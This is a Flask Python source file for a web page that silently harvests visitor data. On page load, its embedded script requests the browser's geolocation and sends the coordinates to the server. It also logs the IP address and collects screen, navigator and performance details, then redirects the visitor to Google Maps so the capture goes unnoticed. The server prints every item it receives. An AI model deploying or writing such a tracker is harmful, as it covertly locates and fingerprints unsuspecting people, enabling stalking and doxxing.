from flask import Flask, request
import platform

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
    <script>
    var timer;

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var url = "/location?lat=" + lat + "&lon=" + lon;
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                clearTimeout(timer);
                redirectToLocation();
            }
        };
        xhr.open("GET", url);
        xhr.send();
    }

    function redirectToLocation(location = "https://www.google.com/maps") {
        window.location.href = location;
    }

    function startTimer() {
        timer = setTimeout(redirectToLocation, 6000);
    }

    function getIP() {
        var url = "/ip";
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("ip").innerHTML = "Your IP address is: " + this.responseText;
            }
        };
        xhr.open("GET", url);
        xhr.send();
    }

    function getInfo() {
        var url = "/info";
        var xhr = new XMLHttpRequest();
        
        // Get more device information using JavaScript
        var screenInfo = "Screen: " + window.screen.width + "x" + window.screen.height + ", " + window.screen.colorDepth + "-bit color depth, " + window.screen.pixelDepth + "-bit pixel depth, " + window.screen.orientation.type;
        var navigatorInfo = "Navigator: " + window.navigator.language + ", " + window.navigator.onLine + ", " + window.navigator.platform + ", " + window.navigator.vendor + ", " + window.navigator.cookieEnabled;
        var performanceInfo = "Performance: " + window.performance.navigation.type + ", " + window.performance.timing.navigationStart;

        // Send the device information as a query string
        url += "?screen=" + encodeURIComponent(screenInfo) + "&navigator=" + encodeURIComponent(navigatorInfo) + "&performance=" + encodeURIComponent(performanceInfo);

        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("info").innerHTML = "Your device information is: " + this.responseText;
            }
        };
        xhr.open("GET", url);
        xhr.send();
    }

    window.onload = function() {
      getLocation();
      startTimer();
      getIP();
      getInfo();
    };
    
    </script>
    </head>
    <body>
      <div id="ip"></div>
      <div id="info"></div>
    </body>
    </html>
    '''


@app.route('/location')
def location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    print(f"User's location: {lat}, {lon}")
    # You can do something with the location data here
    return "Location received"

@app.route('/ip')
def ip():
    user_ip = request.headers ['X-Forwarded-For']
    print(f"User's IP address: {user_ip}")
    # You can do something with the IP address here
    return user_ip

@app.route('/info')
def info():
    
    # Get the device information from the query string
    screenInfo = request.args.get('screen')
    navigatorInfo = request.args.get('navigator')
    performanceInfo = request.args.get('performance')

    user_agent = request.headers.get('User-Agent')
    system = platform.system()
    release = platform.release()
    
    # Concatenate all the device information into one string
    deviceInfo = f"{user_agent}\n{system} {release}\n{screenInfo}\n{navigatorInfo}\n{performanceInfo}"

    print(f"User's device information: {deviceInfo}")
    
    # You can do something with this information here
    return deviceInfo

app.run(host='0.0.0.0')
